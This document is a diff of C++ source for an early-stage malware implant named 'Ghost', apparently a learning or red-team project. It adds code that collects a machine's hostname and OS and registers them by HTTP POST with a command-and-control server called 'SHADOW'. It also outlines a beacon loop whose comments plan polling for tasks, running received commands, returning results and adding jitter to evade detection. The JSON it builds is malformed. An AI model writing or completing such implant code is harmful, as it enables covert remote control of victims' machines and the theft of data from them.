@@ -161,7 +161,7 @@ public:
         #endif
     }
 
-    std::string sendRequestTcp(const std::string& method, const std::string& uri, const std::string& body = "") {
+    std::string sendHttpRequest(const std::string& method, const std::string& uri, const std::string& body = "") {
         SOCKET_TYPE sock = socket(AF_INET, SOCK_STREAM, 0); // we only support ipv4 for the foreseeable future; SOCK_STREAM = TCP, SOCK_DGRAM = UDP
         if (!IS_VALID_SOCKET(sock)) return "";
 
@@ -222,19 +222,38 @@ public:
 class Ghost {
 private:
     std::string uuid;
+    std::string hostname;
+
+    HttpClient client;
+    int sleepInterval;
 public:
-    Ghost() {
-        // a potential problem arises if the implant gets reinstalled
-        // it'll cause it to generate a new uuid
-        // SHADOW won't know it's the same one
-        // TODO: how to combat this?
-        uuid = Utils::generateUuid();
-    }
+    // a potential problem with UUID arises if the implant gets reinstalled
+    // it'll cause it to generate a new uuid
+    // SHADOW won't know it's the same one
+    // TODO: how to combat this?
+    Ghost(std::string ip, int port, int sleepInterval = 60) : uuid(Utils::generateUuid()), hostname(Utils::getHostname()), client(ip, port), sleepInterval(sleepInterval) {}
 
     bool registerGhost() {
         std::cout << "[GHOST] trying to register with SHADOW\n";
-        // TODO: request the registration in SHADOW
-        // TODO: ideally get back some sort of a config, but for now just get success code
+        
+        std::stringstream json;
+        json << "{"
+            << "\"id\":" << uuid << "\","
+            << "\"hostname\":" << hostname << "\","
+            << "\"os\":" << OS_PLATFORM << "\","
+            << "\"last_seen\":0"
+            << "}";
+
+        std::string response = client.sendHttpRequest("POST", "/ghost", json.str());
+
+        // TODO: ideally get back some sort of a config, but for now just get any data
+        // TODO: make this check the reponse code instead
+        if (!response.empty()) {
+            std::cout << "REGISTRATION SUCCESSFUL\n";
+
+            return true;
+        }
+
         return false; 
     }
 
@@ -242,9 +261,15 @@ public:
         std::cout << "[GHOST] starting the beacon\n";
 
         while (true) {
-            // TODO: beaconing logic
             std::cout << "[beacon] pulse sent\n";
             
+            // poll for task
+            // parse the data
+            // execute received commands
+            // send back result
+            // sleep until next pulse
+
+            // TODO: jitter for obfuscation
             sleep(5 * SLEEP_MULTIPLIER);
         }
     }
@@ -257,7 +282,7 @@ int main() {
     // TODO: think through the oop approach
     // will need to see real implants to know how it should be done
     // this one is mainly for testing
-    Ghost ghost;
+    Ghost ghost(SHADOW_IP, SHADOW_PORT);
 
     // try to register with SHADOW
     while (!ghost.registerGhost()) {
